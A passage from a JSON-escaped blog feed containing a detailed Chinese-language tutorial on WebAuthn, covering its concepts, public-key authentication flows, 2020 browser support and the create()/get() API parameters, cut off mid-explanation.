4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 